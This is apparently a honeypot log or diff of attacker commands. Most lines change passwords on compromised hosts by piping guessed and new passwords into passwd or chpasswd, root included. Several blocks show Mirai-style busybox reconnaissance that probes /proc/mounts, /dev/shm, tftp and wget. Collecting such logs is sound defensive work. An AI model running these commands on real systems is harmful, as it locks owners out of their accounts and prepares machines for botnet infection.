+echo "mysql@123\n0Tlz3UvVSl7B\n0Tlz3UvVSl7B\n"|passwd
+echo -e "viktor\nCicvWK7ms2qV\nCicvWK7ms2qV"|passwd|bash
+echo -e "michaelwilson\nhge1LIgfHXsL\nhge1LIgfHXsL"|passwd|bash
+echo "michaelwilson\ne1nYKtmgejzf\ne1nYKtmgejzf\n"|passwd
+echo -e "live\nYKkWwD9owtu9\nYKkWwD9owtu9"|passwd|bash
+echo "123456\nBRirH7VTzhb3\nBRirH7VTzhb3\n"|passwd
+echo "viktor\nCicvWK7ms2qV\nCicvWK7ms2qV\n"|passwd
+echo "michaelwilson\nhge1LIgfHXsL\nhge1LIgfHXsL\n"|passwd
+echo "root:y8IXg7dwaBhx"|chpasswd|bash
+echo -e "michaelwilson\n6BrWlSnFOZSm\n6BrWlSnFOZSm"|passwd|bash
+echo "live\nYKkWwD9owtu9\nYKkWwD9owtu9\n"|passwd
+echo "root:jMfl2rmTvY9o"|chpasswd|bash
+echo -e "123456\nzxSaBPoCGrTD\nzxSaBPoCGrTD"|passwd|bash
+echo "michaelwilson\n6BrWlSnFOZSm\n6BrWlSnFOZSm\n"|passwd
+echo -e "123456\nuABFWfilN8Ka\nuABFWfilN8Ka"|passwd|bash
+echo -e "123\nY3mlvqISCyAZ\nY3mlvqISCyAZ"|passwd|bash
+echo "123456\nzxSaBPoCGrTD\nzxSaBPoCGrTD\n"|passwd
+echo "123456\nuABFWfilN8Ka\nuABFWfilN8Ka\n"|passwd
+echo "123\nY3mlvqISCyAZ\nY3mlvqISCyAZ\n"|passwd
+echo -e "E2a74d9498\ng8SqVJxP53IF\ng8SqVJxP53IF"|passwd|bash
+echo -e "viktor\ng8SqVJxP53IF\ng8SqVJxP53IF"|passwd|bash
+echo "viktor\ng8SqVJxP53IF\ng8SqVJxP53IF\n"|passwd
+echo "E2a74d9498\ng8SqVJxP53IF\ng8SqVJxP53IF\n"|passwd
+echo -e "live\nEpfW2qNSeAJ6\nEpfW2qNSeAJ6"|passwd|bash
+echo "live\nEpfW2qNSeAJ6\nEpfW2qNSeAJ6\n"|passwd
+echo -e "123456\nlNxOV0vezYzO\nlNxOV0vezYzO"|passwd|bash
+echo "123456\nlNxOV0vezYzO\nlNxOV0vezYzO\n"|passwd
+echo -e "viktor\nxgDPV2VBwmrJ\nxgDPV2VBwmrJ"|passwd|bash
+echo "viktor\nxgDPV2VBwmrJ\nxgDPV2VBwmrJ\n"|passwd
+echo -e "live\nMsMQ7tzHw4Ri\nMsMQ7tzHw4Ri"|passwd|bash
+echo -e "live\nVliq09ZbT0y9\nVliq09ZbT0y9"|passwd|bash
+echo "live\nMsMQ7tzHw4Ri\nMsMQ7tzHw4Ri\n"|passwd
+echo "live\nVliq09ZbT0y9\nVliq09ZbT0y9\n"|passwd
+echo -e "viktor\ndrZXS71PZjyN\ndrZXS71PZjyN"|passwd|bash
+echo -e "mysql@123\n9HtYdfJbwXE1\n9HtYdfJbwXE1"|passwd|bash
+echo "viktor\ndrZXS71PZjyN\ndrZXS71PZjyN\n"|passwd
+echo "mysql@123\n9HtYdfJbwXE1\n9HtYdfJbwXE1\n"|passwd
+echo -e "viktor\nrxjAjNfbv8OG\nrxjAjNfbv8OG"|passwd|bash
+echo -e "pa55word\nwkvKOwX4G0Dc\nwkvKOwX4G0Dc"|passwd|bash
+echo "viktor\nrxjAjNfbv8OG\nrxjAjNfbv8OG\n"|passwd
+echo "pa55word\nwkvKOwX4G0Dc\nwkvKOwX4G0Dc\n"|passwd
+echo -e "mysql@123\nXvnDsfhHHTMW\nXvnDsfhHHTMW"|passwd|bash
+echo "mysql@123\nXvnDsfhHHTMW\nXvnDsfhHHTMW\n"|passwd
+echo "root:T8wO9KHJFYCO"|chpasswd|bash
+echo -e "live\nxdjTQI1jcICz\nxdjTQI1jcICz"|passwd|bash
+echo -e "mysql@123\nQKdqvJLD8L8h\nQKdqvJLD8L8h"|passwd|bash
+echo -e "kruwaraporn\nJLwnVE2lDT1c\nJLwnVE2lDT1c"|passwd|bash
+echo -e "123456\njppN3SqgRCNE\njppN3SqgRCNE"|passwd|bash
+echo "live\nxdjTQI1jcICz\nxdjTQI1jcICz\n"|passwd
+echo "kruwaraporn\nJLwnVE2lDT1c\nJLwnVE2lDT1c\n"|passwd
+echo "mysql@123\nQKdqvJLD8L8h\nQKdqvJLD8L8h\n"|passwd
+echo "123456\njppN3SqgRCNE\njppN3SqgRCNE\n"|passwd
+echo -e "reu\n0xcyWTdO1yvU\n0xcyWTdO1yvU"|passwd|bash
+echo -e "123456\n9yTSUV92VsXF\n9yTSUV92VsXF"|passwd|bash
+echo "reu\n0xcyWTdO1yvU\n0xcyWTdO1yvU\n"|passwd
+echo -e "mysql@123\nXQx9lFdh1DR7\nXQx9lFdh1DR7"|passwd|bash
+echo "123456\n9yTSUV92VsXF\n9yTSUV92VsXF\n"|passwd
+echo -e "reu\nNSgMHWY3XqNo\nNSgMHWY3XqNo"|passwd|bash
+echo "mysql@123\nXQx9lFdh1DR7\nXQx9lFdh1DR7\n"|passwd
+echo "reu\nNSgMHWY3XqNo\nNSgMHWY3XqNo\n"|passwd
+echo -e "xing\nsCJra5mLnRqi\nsCJra5mLnRqi"|passwd|bash
+echo -e "estudioremoto\netSHFvXIUtKl\netSHFvXIUtKl"|passwd|bash
+echo "xing\nsCJra5mLnRqi\nsCJra5mLnRqi\n"|passwd
+echo -e "reu\ngldKdxlhs4D6\ngldKdxlhs4D6"|passwd|bash
+echo -e "jessalyn\nEsIR9nqJlSZI\nEsIR9nqJlSZI"|passwd|bash
+echo "estudioremoto\netSHFvXIUtKl\netSHFvXIUtKl\n"|passwd
+echo -e "estudioremoto\np4Lw3pZYfRkF\np4Lw3pZYfRkF"|passwd|bash
+echo "reu\ngldKdxlhs4D6\ngldKdxlhs4D6\n"|passwd
+echo -e "estudioremoto\nX8zVOVS3yaBN\nX8zVOVS3yaBN"|passwd|bash
+echo -e "kruwaraporn\nti8OZSMKl8Jm\nti8OZSMKl8Jm"|passwd|bash
+echo "jessalyn\nEsIR9nqJlSZI\nEsIR9nqJlSZI\n"|passwd
+echo -e "estudioremoto\nBkQ9O7hk4rqs\nBkQ9O7hk4rqs"|passwd|bash
+echo "estudioremoto\np4Lw3pZYfRkF\np4Lw3pZYfRkF\n"|passwd
+echo "estudioremoto\nX8zVOVS3yaBN\nX8zVOVS3yaBN\n"|passwd
+echo "kruwaraporn\nti8OZSMKl8Jm\nti8OZSMKl8Jm\n"|passwd
+echo "estudioremoto\nBkQ9O7hk4rqs\nBkQ9O7hk4rqs\n"|passwd
+echo "root:pUNC9FFKorAG"|chpasswd|bash
+echo -e "estudioremoto\nlX3jWAKf9gRs\nlX3jWAKf9gRs"|passwd|bash
+echo -e "test\nlX3jWAKf9gRs\nlX3jWAKf9gRs"|passwd|bash
+echo "estudioremoto\nlX3jWAKf9gRs\nlX3jWAKf9gRs\n"|passwd
+echo "test\nlX3jWAKf9gRs\nlX3jWAKf9gRs\n"|passwd
+echo -e "estudioremoto\nI5zf8XezrSdg\nI5zf8XezrSdg"|passwd|bash
+echo "estudioremoto\nI5zf8XezrSdg\nI5zf8XezrSdg\n"|passwd
+echo -e "reu\n6LRodfE84oRy\n6LRodfE84oRy"|passwd|bash
+echo "reu\n6LRodfE84oRy\n6LRodfE84oRy\n"|passwd
+echo -e "kruwaraporn\n97FABNjVvtYm\n97FABNjVvtYm"|passwd|bash
+echo "kruwaraporn\n97FABNjVvtYm\n97FABNjVvtYm\n"|passwd
+echo -e "adna\nDNkn5eS2rCoV\nDNkn5eS2rCoV"|passwd|bash
+echo -e "estudioremoto\nPwv5vVOQaeBG\nPwv5vVOQaeBG"|passwd|bash
+echo -e "xing\nVbrPtemYdY4g\nVbrPtemYdY4g"|passwd|bash
+echo -e "reu\nhmWZthPLbV2v\nhmWZthPLbV2v"|passwd|bash
+echo "estudioremoto\nPwv5vVOQaeBG\nPwv5vVOQaeBG\n"|passwd
+echo "adna\nDNkn5eS2rCoV\nDNkn5eS2rCoV\n"|passwd
+echo "xing\nVbrPtemYdY4g\nVbrPtemYdY4g\n"|passwd
+echo -e "kruwaraporn\nC0sRAMhxHVtv\nC0sRAMhxHVtv"|passwd|bash
+echo "reu\nhmWZthPLbV2v\nhmWZthPLbV2v\n"|passwd
+echo "kruwaraporn\nC0sRAMhxHVtv\nC0sRAMhxHVtv\n"|passwd
+echo -e "123456\nhbucvwkO8Dup\nhbucvwkO8Dup"|passwd|bash
+echo -e "xing\nrgmbGo0YEmn6\nrgmbGo0YEmn6"|passwd|bash
+echo "123456\nhbucvwkO8Dup\nhbucvwkO8Dup\n"|passwd
+echo "xing\nrgmbGo0YEmn6\nrgmbGo0YEmn6\n"|passwd
+echo -e "adna\nJ8RQgdjb2b0P\nJ8RQgdjb2b0P"|passwd|bash
+echo -e "estudioremoto\nUiEV0nr6B7Ow\nUiEV0nr6B7Ow"|passwd|bash
+echo "estudioremoto\nUiEV0nr6B7Ow\nUiEV0nr6B7Ow\n"|passwd
+echo "adna\nJ8RQgdjb2b0P\nJ8RQgdjb2b0P\n"|passwd
+echo -e "kruwaraporn\nu8xCfIrlfIuq\nu8xCfIrlfIuq"|passwd|bash
+echo "kruwaraporn\nu8xCfIrlfIuq\nu8xCfIrlfIuq\n"|passwd
+echo -e "xing\nFWa0EibQaWsS\nFWa0EibQaWsS"|passwd|bash
+echo -e "iakovidis\neM167tKFEy1M\neM167tKFEy1M"|passwd|bash
+echo -e "kruwaraporn\nkvIst0Hyyl0b\nkvIst0Hyyl0b"|passwd|bash
+echo "xing\nFWa0EibQaWsS\nFWa0EibQaWsS\n"|passwd
+echo "kruwaraporn\nkvIst0Hyyl0b\nkvIst0Hyyl0b\n"|passwd
+echo "iakovidis\neM167tKFEy1M\neM167tKFEy1M\n"|passwd
+echo -e "reu\nu9kbfJtuhJqQ\nu9kbfJtuhJqQ"|passwd|bash
+echo -e "kruwaraporn\ngCRbhGPTGC5K\ngCRbhGPTGC5K"|passwd|bash
+echo -e "iakovidis\ngCRbhGPTGC5K\ngCRbhGPTGC5K"|passwd|bash
+echo "reu\nu9kbfJtuhJqQ\nu9kbfJtuhJqQ\n"|passwd
+echo -e "bruno\nYFAEAzirSLhu\nYFAEAzirSLhu"|passwd|bash
+echo "kruwaraporn\ngCRbhGPTGC5K\ngCRbhGPTGC5K\n"|passwd
+echo "iakovidis\ngCRbhGPTGC5K\ngCRbhGPTGC5K\n"|passwd
+echo "bruno\nYFAEAzirSLhu\nYFAEAzirSLhu\n"|passwd
+echo -e "reu\nrbvzkFM9p2KX\nrbvzkFM9p2KX"|passwd|bash
+echo "reu\nrbvzkFM9p2KX\nrbvzkFM9p2KX\n"|passwd
+echo -e "xing\n6ZNnBYbvVMZd\n6ZNnBYbvVMZd"|passwd|bash
+echo "xing\n6ZNnBYbvVMZd\n6ZNnBYbvVMZd\n"|passwd
+echo -e "iakovidis\ngAfScPb2HEQ6\ngAfScPb2HEQ6"|passwd|bash
+echo -e "123\nR3brcyNNWnCu\nR3brcyNNWnCu"|passwd|bash
+echo "iakovidis\ngAfScPb2HEQ6\ngAfScPb2HEQ6\n"|passwd
+echo "123\nR3brcyNNWnCu\nR3brcyNNWnCu\n"|passwd
+echo -e "iakovidis\nAAJ3W6A80CSO\nAAJ3W6A80CSO"|passwd|bash
+echo "iakovidis\nAAJ3W6A80CSO\nAAJ3W6A80CSO\n"|passwd
+echo -e "estudioremoto\n8JGutJSSnNUt\n8JGutJSSnNUt"|passwd|bash
+echo -e "estudioremoto\nonVOvQ6LFfgE\nonVOvQ6LFfgE"|passwd|bash
+echo "estudioremoto\n8JGutJSSnNUt\n8JGutJSSnNUt\n"|passwd
+echo "estudioremoto\nonVOvQ6LFfgE\nonVOvQ6LFfgE\n"|passwd
+echo -e "xing\nZUNfkB521m5t\nZUNfkB521m5t"|passwd|bash
+echo "xing\nZUNfkB521m5t\nZUNfkB521m5t\n"|passwd
+echo -e "xing\nqdv0Z44KtqS5\nqdv0Z44KtqS5"|passwd|bash
+echo "xing\nqdv0Z44KtqS5\nqdv0Z44KtqS5\n"|passwd
+echo -e "adna\nnT6ANSz5ZWlQ\nnT6ANSz5ZWlQ"|passwd|bash
+echo "adna\nnT6ANSz5ZWlQ\nnT6ANSz5ZWlQ\n"|passwd
+echo -e "xing\nRA8dFLn2HgOH\nRA8dFLn2HgOH"|passwd|bash
+echo "xing\nRA8dFLn2HgOH\nRA8dFLn2HgOH\n"|passwd
+echo -e "xing\nh6dZXq4J4p1p\nh6dZXq4J4p1p"|passwd|bash
+echo "xing\nh6dZXq4J4p1p\nh6dZXq4J4p1p\n"|passwd
+echo -e "estudioremoto\nu1XB1bdLFxzV\nu1XB1bdLFxzV"|passwd|bash
+echo "estudioremoto\nu1XB1bdLFxzV\nu1XB1bdLFxzV\n"|passwd
+echo -e "xing\nAJRYw3kHFFWB\nAJRYw3kHFFWB"|passwd|bash
+echo "xing\nAJRYw3kHFFWB\nAJRYw3kHFFWB\n"|passwd
+echo -e "adna\nhLMolIz3EwM4\nhLMolIz3EwM4"|passwd|bash
+echo "adna\nhLMolIz3EwM4\nhLMolIz3EwM4\n"|passwd
+echo -e "xing\n5jHhbQGRcbe7\n5jHhbQGRcbe7"|passwd|bash
+echo "xing\n5jHhbQGRcbe7\n5jHhbQGRcbe7\n"|passwd
+echo "root:18CC4GKJ6Xx4"|chpasswd|bash
+echo -e "iakovidis\nilFUGWgUb5Ro\nilFUGWgUb5Ro"|passwd|bash
+echo "iakovidis\nilFUGWgUb5Ro\nilFUGWgUb5Ro\n"|passwd
+echo -e "labochemengui\nW6iCX78jBkY0\nW6iCX78jBkY0"|passwd|bash
+echo -e "labochemengui\nr3xYs6uQcxCt\nr3xYs6uQcxCt"|passwd|bash
+echo "labochemengui\nr3xYs6uQcxCt\nr3xYs6uQcxCt\n"|passwd
+echo -e "xing\nKolHeITPx8Dz\nKolHeITPx8Dz"|passwd|bash
+echo "xing\nKolHeITPx8Dz\nKolHeITPx8Dz\n"|passwd
+echo -e "iakovidis\nBxXwd3G0qSdI\nBxXwd3G0qSdI"|passwd|bash
+echo -e "adna\nKolHeITPx8Dz\nKolHeITPx8Dz"|passwd|bash
+echo "adna\nKolHeITPx8Dz\nKolHeITPx8Dz\n"|passwd
+echo "iakovidis\nBxXwd3G0qSdI\nBxXwd3G0qSdI\n"|passwd
+echo -e "iakovidis\nhWBRbQjxaBuC\nhWBRbQjxaBuC"|passwd|bash
+echo "labochemengui\nW6iCX78jBkY0\nW6iCX78jBkY0\n"|passwd
+echo "iakovidis\nhWBRbQjxaBuC\nhWBRbQjxaBuC\n"|passwd
+echo -e "iakovidis\niA5UBbGI83BB\niA5UBbGI83BB"|passwd|bash
+echo "iakovidis\niA5UBbGI83BB\niA5UBbGI83BB\n"|passwd
+echo -e "labochemengui\nydCd6MrVklRH\nydCd6MrVklRH"|passwd|bash
+echo -e "adna\nYNQJGq14rTMt\nYNQJGq14rTMt"|passwd|bash
+echo "labochemengui\nydCd6MrVklRH\nydCd6MrVklRH\n"|passwd
+echo "adna\nYNQJGq14rTMt\nYNQJGq14rTMt\n"|passwd
+echo -e "adna\ncc11XWwVlQ1e\ncc11XWwVlQ1e"|passwd|bash
+echo "adna\ncc11XWwVlQ1e\ncc11XWwVlQ1e\n"|passwd
+echo -e "iakovidis\n6lblSXqryIUm\n6lblSXqryIUm"|passwd|bash
+echo "iakovidis\n6lblSXqryIUm\n6lblSXqryIUm\n"|passwd
+echo -e "adna\nl7SShSULFvHK\nl7SShSULFvHK"|passwd|bash
+echo "adna\nl7SShSULFvHK\nl7SShSULFvHK\n"|passwd
+echo -e "labochemengui\nDJn2f1ANn4tw\nDJn2f1ANn4tw"|passwd|bash
+echo "labochemengui\nDJn2f1ANn4tw\nDJn2f1ANn4tw\n"|passwd
+echo -e "labochemengui\nnExbhGT8cw8M\nnExbhGT8cw8M"|passwd|bash
+echo "labochemengui\nnExbhGT8cw8M\nnExbhGT8cw8M\n"|passwd
+echo -e "labochemengui\nbD8gADvUNEeT\nbD8gADvUNEeT"|passwd|bash
+echo "labochemengui\nbD8gADvUNEeT\nbD8gADvUNEeT\n"|passwd
+echo -e "labochemengui\nnCjNOhJHcQA0\nnCjNOhJHcQA0"|passwd|bash
+echo "labochemengui\nnCjNOhJHcQA0\nnCjNOhJHcQA0\n"|passwd
+echo -e "adna\nfxWZKe24luX7\nfxWZKe24luX7"|passwd|bash
+echo "adna\nfxWZKe24luX7\nfxWZKe24luX7\n"|passwd
+cat /proc/mounts; /bin/busybox AZYGC
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AZYGC
+tftp; wget; /bin/busybox AZYGC
+/bin/busybox AZYGC
+echo -e "iakovidis\nLXpXtMSacQSW\nLXpXtMSacQSW"|passwd|bash
+echo "iakovidis\nLXpXtMSacQSW\nLXpXtMSacQSW\n"|passwd
+echo -e "adna\ntIgsulJl1fQU\ntIgsulJl1fQU"|passwd|bash
+echo "adna\ntIgsulJl1fQU\ntIgsulJl1fQU\n"|passwd
+echo -e "adna\nQAJJUtuMdQ9I\nQAJJUtuMdQ9I"|passwd|bash
+echo -e "labochemengui\nNNLLckk6wVbj\nNNLLckk6wVbj"|passwd|bash
+echo "adna\nQAJJUtuMdQ9I\nQAJJUtuMdQ9I\n"|passwd
+echo "labochemengui\nNNLLckk6wVbj\nNNLLckk6wVbj\n"|passwd
+echo -e "iakovidis\noAsL7HrP1fk1\noAsL7HrP1fk1"|passwd|bash
+echo "iakovidis\noAsL7HrP1fk1\noAsL7HrP1fk1\n"|passwd
+echo -e "iakovidis\nGoTIZJdS5Auy\nGoTIZJdS5Auy"|passwd|bash
+echo "iakovidis\nGoTIZJdS5Auy\nGoTIZJdS5Auy\n"|passwd
+echo -e "iakovidis\nhOLrZ3jyBVN6\nhOLrZ3jyBVN6"|passwd|bash
+echo "iakovidis\nhOLrZ3jyBVN6\nhOLrZ3jyBVN6\n"|passwd
+echo -e "123456\n2ZAsfkqLRUQG\n2ZAsfkqLRUQG"|passwd|bash
+echo "123456\n2ZAsfkqLRUQG\n2ZAsfkqLRUQG\n"|passwd
+echo -e "labochemengui\nszl9dgJoEJnf\nszl9dgJoEJnf"|passwd|bash
+echo "labochemengui\nszl9dgJoEJnf\nszl9dgJoEJnf\n"|passwd
+echo -e "labochemengui\n3ToHiv7yVVfv\n3ToHiv7yVVfv"|passwd|bash
+echo "labochemengui\n3ToHiv7yVVfv\n3ToHiv7yVVfv\n"|passwd
+echo -e "labochemengui\nL0jEXxNeIPdL\nL0jEXxNeIPdL"|passwd|bash
+echo "labochemengui\nL0jEXxNeIPdL\nL0jEXxNeIPdL\n"|passwd
+cat /proc/mounts; /bin/busybox ZYABS
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZYABS
+tftp; wget; /bin/busybox ZYABS
+/bin/busybox ZYABS
+echo -e "222\nZmhi04CPL5MK\nZmhi04CPL5MK"|passwd|bash
+echo "222\nZmhi04CPL5MK\nZmhi04CPL5MK\n"|passwd
+echo -e "labochemengui\nZUgFWD7A2sPd\nZUgFWD7A2sPd"|passwd|bash
+echo "labochemengui\nZUgFWD7A2sPd\nZUgFWD7A2sPd\n"|passwd
+echo -e "clifford\nyOyiJBADnkq1\nyOyiJBADnkq1"|passwd|bash
+echo "clifford\nyOyiJBADnkq1\nyOyiJBADnkq1\n"|passwd
+echo -e "evangeline\n1hiASrb85rvz\n1hiASrb85rvz"|passwd|bash
+echo "evangeline\n1hiASrb85rvz\n1hiASrb85rvz\n"|passwd
+echo -e "carregal\nc2lA6PSZVePs\nc2lA6PSZVePs"|passwd|bash
+echo "carregal\nc2lA6PSZVePs\nc2lA6PSZVePs\n"|passwd
+echo "root:PodKx7P5DRdW"|chpasswd|bash
+echo "root:BdBBbc6Ngg7D"|chpasswd|bash
+echo -e "htdonnah\nWsGPneZyn24p\nWsGPneZyn24p"|passwd|bash
+echo "htdonnah\nWsGPneZyn24p\nWsGPneZyn24p\n"|passwd
+echo "root:5GzFlN0UKg79"|chpasswd|bash
+echo -e "TP\neUnPcWrnQk1y\neUnPcWrnQk1y"|passwd|bash
+echo "TP\neUnPcWrnQk1y\neUnPcWrnQk1y\n"|passwd
+echo -e "Tim\n6If7v1BPkfWe\n6If7v1BPkfWe"|passwd|bash
+echo "Tim\n6If7v1BPkfWe\n6If7v1BPkfWe\n"|passwd
+echo -e "Tim\ngNU0MRSlBFqO\ngNU0MRSlBFqO"|passwd|bash
+echo "Tim\ngNU0MRSlBFqO\ngNU0MRSlBFqO\n"|passwd
+echo -e "amar\nv8TD8NcyewlK\nv8TD8NcyewlK"|passwd|bash
+echo "amar\nv8TD8NcyewlK\nv8TD8NcyewlK\n"|passwd
+cat /proc/mounts; /bin/busybox JEZFY
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JEZFY
+tftp; wget; /bin/busybox JEZFY
+/bin/busybox JEZFY
+(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
+echo -e "TP\nrx3ajmhR8tBK\nrx3ajmhR8tBK"|passwd|bash
+echo "TP\nrx3ajmhR8tBK\nrx3ajmhR8tBK\n"|passwd
+echo -e "alsh\nGBtPlKXNqgWy\nGBtPlKXNqgWy"|passwd|bash
+echo "alsh\nGBtPlKXNqgWy\nGBtPlKXNqgWy\n"|passwd
+echo "root:Vt9zV4N4WvWg"|chpasswd|bash
+echo -e "pohl\nXKXKEvLu2Ckk\nXKXKEvLu2Ckk"|passwd|bash
+echo "pohl\nXKXKEvLu2Ckk\nXKXKEvLu2Ckk\n"|passwd
+echo "root:ZOVtD8ufl5PS"|chpasswd|bash
+echo -e "faza\nMSIYhx2jK8bR\nMSIYhx2jK8bR"|passwd|bash
+echo "faza\nMSIYhx2jK8bR\nMSIYhx2jK8bR\n"|passwd
+echo -e "aleksandarmilosevic\nf0kGaXjXBqU5\nf0kGaXjXBqU5"|passwd|bash
+echo "aleksandarmilosevic\nf0kGaXjXBqU5\nf0kGaXjXBqU5\n"|passwd
+echo -e "pohl\nM9gDXpelIVTe\nM9gDXpelIVTe"|passwd|bash
+echo "pohl\nM9gDXpelIVTe\nM9gDXpelIVTe\n"|passwd
+echo -e "git1234\nYMqL2s6a0iRo\nYMqL2s6a0iRo"|passwd|bash
+echo "git1234\nYMqL2s6a0iRo\nYMqL2s6a0iRo\n"|passwd
+echo -e "qazwsxedc\nVIVJ4WdJg0Xo\nVIVJ4WdJg0Xo"|passwd|bash
+echo "qazwsxedc\nVIVJ4WdJg0Xo\nVIVJ4WdJg0Xo\n"|passwd
+echo -e "newadmin\nMD0MoDaa2c1p\nMD0MoDaa2c1p"|passwd|bash
+echo "newadmin\nMD0MoDaa2c1p\nMD0MoDaa2c1p\n"|passwd
+echo -e "72b1bd75ac87852a\nSksiXK7RsEV8\nSksiXK7RsEV8"|passwd|bash
+echo "72b1bd75ac87852a\nSksiXK7RsEV8\nSksiXK7RsEV8\n"|passwd
+echo -e "prometheus\nZi36OFd6DPli\nZi36OFd6DPli"|passwd|bash
+echo "prometheus\nZi36OFd6DPli\nZi36OFd6DPli\n"|passwd
+echo -e "terminal\nHzcKesDI7sd6\nHzcKesDI7sd6"|passwd|bash
+echo "terminal\nHzcKesDI7sd6\nHzcKesDI7sd6\n"|passwd
+cat /proc/mounts; /bin/busybox JKUDE
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JKUDE
+tftp; wget; /bin/busybox JKUDE
+/bin/busybox JKUDE
+echo "root:WfFEKCXOEuQe"|chpasswd|bash
+echo -e "newadmin\nujwNdAqkjO4E\nujwNdAqkjO4E"|passwd|bash
+echo "newadmin\nujwNdAqkjO4E\nujwNdAqkjO4E\n"|passwd
+echo -e "desmedicos\njq9X4xYY0cUP\njq9X4xYY0cUP"|passwd|bash
+echo "desmedicos\njq9X4xYY0cUP\njq9X4xYY0cUP\n"|passwd
+echo -e "desmedicos\nfzwQQG7N5Iaw\nfzwQQG7N5Iaw"|passwd|bash
+echo "desmedicos\nfzwQQG7N5Iaw\nfzwQQG7N5Iaw\n"|passwd
+echo -e "react\nxNnEd2lpc1TO\nxNnEd2lpc1TO"|passwd|bash
+echo "react\nxNnEd2lpc1TO\nxNnEd2lpc1TO\n"|passwd
+echo -e "niifs\nR9CLIPVDIXiI\nR9CLIPVDIXiI"|passwd|bash
+echo "niifs\nR9CLIPVDIXiI\nR9CLIPVDIXiI\n"|passwd
+echo -e "ghoti\nb1rjNA7vbMQl\nb1rjNA7vbMQl"|passwd|bash
+echo "ghoti\nb1rjNA7vbMQl\nb1rjNA7vbMQl\n"|passwd
+echo -e "plantillaseducespecial\nBk3XPcub6ros\nBk3XPcub6ros"|passwd|bash
+echo "plantillaseducespecial\nBk3XPcub6ros\nBk3XPcub6ros\n"|passwd
+echo -e "anil\nNqSWfnw58h52\nNqSWfnw58h52"|passwd|bash
+echo "anil\nNqSWfnw58h52\nNqSWfnw58h52\n"|passwd
+echo -e "logviewer\n62nbrNHumOGi\n62nbrNHumOGi"|passwd|bash
+echo "logviewer\n62nbrNHumOGi\n62nbrNHumOGi\n"|passwd
+echo -e "xw\n1e34uhrFLf3X\n1e34uhrFLf3X"|passwd|bash
+echo "xw\n1e34uhrFLf3X\n1e34uhrFLf3X\n"|passwd
+echo -e "master2\nvmn5hWM4Kx7h\nvmn5hWM4Kx7h"|passwd|bash
+echo "master2\nvmn5hWM4Kx7h\nvmn5hWM4Kx7h\n"|passwd
+echo -e "mike123\n34S0w3t5v269\n34S0w3t5v269"|passwd|bash
+echo "mike123\n34S0w3t5v269\n34S0w3t5v269\n"|passwd
+echo -e "rb\nex35EyoUYxnY\nex35EyoUYxnY"|passwd|bash
+echo "rb\nex35EyoUYxnY\nex35EyoUYxnY\n"|passwd
+echo -e "logviewer\nyn66DPsttwEG\nyn66DPsttwEG"|passwd|bash
+echo "logviewer\nyn66DPsttwEG\nyn66DPsttwEG\n"|passwd
+echo -e "swapnil\nEI0hCWRTSV0x\nEI0hCWRTSV0x"|passwd|bash
+echo "swapnil\nEI0hCWRTSV0x\nEI0hCWRTSV0x\n"|passwd
+echo -e "pperry\nQKwU9dll3qti\nQKwU9dll3qti"|passwd|bash
+echo "pperry\nQKwU9dll3qti\nQKwU9dll3qti\n"|passwd
+echo -e "swapnil\nxioQlFgXTmIj\nxioQlFgXTmIj"|passwd|bash
+echo "swapnil\nxioQlFgXTmIj\nxioQlFgXTmIj\n"|passwd
+echo -e "logviewer\njRKnKozDKddm\njRKnKozDKddm"|passwd|bash
+echo "logviewer\njRKnKozDKddm\njRKnKozDKddm\n"|passwd
+echo -e "mike123\ngfJmpADv3fkj\ngfJmpADv3fkj"|passwd|bash
+echo "mike123\ngfJmpADv3fkj\ngfJmpADv3fkj\n"|passwd
+echo -e "xw\nDe16sB9eqqha\nDe16sB9eqqha"|passwd|bash
+echo "xw\nDe16sB9eqqha\nDe16sB9eqqha\n"|passwd
+echo -e "swapnil\nQMr82VWjJnWi\nQMr82VWjJnWi"|passwd|bash
+echo "swapnil\nQMr82VWjJnWi\nQMr82VWjJnWi\n"|passwd
+cat /proc/mounts; /bin/busybox ZKWIE
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZKWIE
+tftp; wget; /bin/busybox ZKWIE
+/bin/busybox ZKWIE
+echo -e "anil\nkCbgpSkMaTQV\nkCbgpSkMaTQV"|passwd|bash
+echo "anil\nkCbgpSkMaTQV\nkCbgpSkMaTQV\n"|passwd
+echo -e "rb\nQA0dHRZgrXKB\nQA0dHRZgrXKB"|passwd|bash
+echo "rb\nQA0dHRZgrXKB\nQA0dHRZgrXKB\n"|passwd
+echo -e "anil\nYy6pyit6Q1kJ\nYy6pyit6Q1kJ"|passwd|bash
+echo "anil\nYy6pyit6Q1kJ\nYy6pyit6Q1kJ\n"|passwd
+echo -e "userbot\nsnAJL9caW8oK\nsnAJL9caW8oK"|passwd|bash
+echo "userbot\nsnAJL9caW8oK\nsnAJL9caW8oK\n"|passwd
+echo -e "rb\nnDip43wPB9bP\nnDip43wPB9bP"|passwd|bash
+echo "rb\nnDip43wPB9bP\nnDip43wPB9bP\n"|passwd
+echo -e "xw\ngQyqhu8S9vSZ\ngQyqhu8S9vSZ"|passwd|bash
+echo "xw\ngQyqhu8S9vSZ\ngQyqhu8S9vSZ\n"|passwd
+echo -e "anil\nHt4RElX26jmT\nHt4RElX26jmT"|passwd|bash
+echo "anil\nHt4RElX26jmT\nHt4RElX26jmT\n"|passwd
+echo -e "rb\nuz1lUQyFYH2n\nuz1lUQyFYH2n"|passwd|bash
+echo "rb\nuz1lUQyFYH2n\nuz1lUQyFYH2n\n"|passwd
+echo -e "xw\nkMRe3jXZRinJ\nkMRe3jXZRinJ"|passwd|bash
+echo "xw\nkMRe3jXZRinJ\nkMRe3jXZRinJ\n"|passwd
+echo -e "mike123\n6O9BBErBysnv\n6O9BBErBysnv"|passwd|bash
+echo "mike123\n6O9BBErBysnv\n6O9BBErBysnv\n"|passwd
+echo -e "leinad\n5z3DRyKkAd29\n5z3DRyKkAd29"|passwd|bash
+echo "leinad\n5z3DRyKkAd29\n5z3DRyKkAd29\n"|passwd
+cat /proc/mounts; /bin/busybox YFERQ
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YFERQ
+tftp; wget; /bin/busybox YFERQ
+/bin/busybox YFERQ
